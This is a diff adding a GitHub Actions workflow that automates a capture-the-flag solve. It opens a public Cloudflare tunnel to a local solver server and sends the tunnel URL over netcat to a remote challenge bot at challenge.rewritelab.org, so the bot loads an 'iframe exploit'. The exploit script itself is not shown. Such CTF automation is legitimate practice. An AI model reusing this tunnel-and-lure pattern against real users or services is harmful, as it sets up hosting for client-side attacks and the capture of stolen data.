@@ -1,0 +1,54 @@
+name: chronostasis-live
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  solve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run intended iframe exploit against live instance
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq netcat-openbsd
+          wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
+          chmod +x /tmp/cloudflared
+
+          python3 -m http.server 8000 --bind 127.0.0.1 >/tmp/dummy.log 2>&1 &
+          DUMMY=$!
+          /tmp/cloudflared tunnel --no-autoupdate --url http://127.0.0.1:8000 >/tmp/cf.log 2>&1 &
+          CF=$!
+
+          URL=''
+          for i in $(seq 1 60); do
+            URL=$(grep -oE 'https://[-a-z0-9]+\.trycloudflare.com' /tmp/cf.log | head -n1 || true)
+            [ -n "$URL" ] && break
+            sleep 1
+          done
+          echo "TUNNEL=$URL"
+          cat /tmp/cf.log
+          test -n "$URL"
+
+          kill "$DUMMY" || true
+          sleep 1
+          python3 ctf/chronostasis_live.py "$URL" >/tmp/solver.log 2>&1 &
+          SOLVER=$!
+          sleep 2
+          curl -fsS "$URL/status?t=live" || true
+
+          echo '===== BOT OUTPUT ====='
+          set +e
+          printf '%s\n' "$URL/start?t=live" | timeout 45 nc challenge.rewritelab.org 35468
+          RC=$?
+          set -e
+          echo "nc_rc=$RC"
+          sleep 2
+          echo '===== SOLVER OUTPUT ====='
+          cat /tmp/solver.log
+
+          kill "$SOLVER" "$CF" || true
